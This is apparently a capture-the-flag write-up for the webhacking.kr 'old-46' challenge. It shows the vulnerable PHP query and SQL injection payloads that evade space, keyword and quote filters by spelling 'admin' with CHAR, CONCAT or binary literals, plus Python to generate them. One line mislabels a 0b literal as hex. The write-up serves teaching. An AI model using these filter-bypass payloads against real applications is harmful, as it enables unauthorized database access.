# Old 46    SQLi (String Formats)

URL: [https://webhacking.kr/challenge/web-23/?view_source=1](https://webhacking.kr/challenge/web-23/?view_source=1)

![old-46.png](/assets/ctf/webhacking.kr/old-46.png)

```php 
<?php if ($_GET["lv"]) {
    $db = dbconnect();
    $_GET["lv"] = addslashes($_GET["lv"]);
    $_GET["lv"] = str_replace(" ", "", $_GET["lv"]);
    $_GET["lv"] = str_replace("/", "", $_GET["lv"]);
    $_GET["lv"] = str_replace("*", "", $_GET["lv"]);
    $_GET["lv"] = str_replace("%", "", $_GET["lv"]);
    if (preg_match("/select|0x|limit|cash/i", $_GET["lv"])) {
        exit();
    }
    $result = mysqli_fetch_array(
        mysqli_query($db, "select id,cash from chall46 where lv=$_GET[lv]")
    );
    if ($result) {
        echo "{$result["id"]} information<br><br>money : {$result["cash"]}";
        if ($result["id"] == "admin") {
            solve(46);
        }
    }
} ?> 
```

```sql
0||id=CONCAT(CHAR(97),CHAR(100),CHAR(109),CHAR(105),CHAR(110))     # Concat each char
(0)OR(id=CONCAT(CHAR(97),CHAR(100),CHAR(109),CHAR(105),CHAR(110))) # With parenthesis
0||id=CHAR(97,100,109,105,110)                                     # CHAR function builds string itself
0||id=0b0110000101100100011011010110100101101110 # Binary String

0||id=0b61646D696E # Hex String <- Wont work due to `0x` filter
0||id=UNHEX('61646D696E')       <- Wont work due to `addslashes`
```

![old-46-1.png](/assets/ctf/webhacking.kr/old-46-1.png)

---

Code used to generate payload:
```python
>>> ','.join(f'CHAR({ord(c)})' for c in 'admin')
'CHAR(97),CHAR(100),CHAR(109),CHAR(105),CHAR(110)'
>>> admin = ','.join(f'CHAR({ord(c)})' for c in 'admin')
>>> print(f'CONCAT({admin})')
CONCAT(CHAR(97),CHAR(100),CHAR(109),CHAR(105),CHAR(110))

>>> print('CHAR(' + ','.join(f'{ord(c)}' for c in 'admin') + ')')
CHAR(97,100,109,105,110)

>>> print('UNHEX(\'' + ''.join(f'{format(ord(c),"0X")}' for c in 'admin') + '\')')
UNHEX('61646D696E')

>>> '0b' + ''.join(f'{format(ord(c), "0b")}' for c in 'admin')
'0b11000011100100110110111010011101110'
```

```sql
SELECT
    'hello' AS string_literal,
    0x68656C6C6F AS hex_literal,
    0b0110100001100101011011000110110001101111 AS binary_literal,
    UNHEX('68656C6C6F') AS unicode_literal,
    CHAR(104, 101, 108, 108, 111) AS char_literal,
    CONCAT('he', 'llo') AS concatenation,
    _binary 'hello' AS blob_literal;
+----------------+-------------+----------------+-----------------+--------------+---------------+--------------+
| string_literal | hex_literal | binary_literal | unicode_literal | char_literal | concatenation | blob_literal |
+----------------+-------------+----------------+-----------------+--------------+---------------+--------------+
| hello          | hello       | hello          | hello           | hello        | hello         | hello        |
+----------------+-------------+----------------+-----------------+--------------+---------------+--------------+
```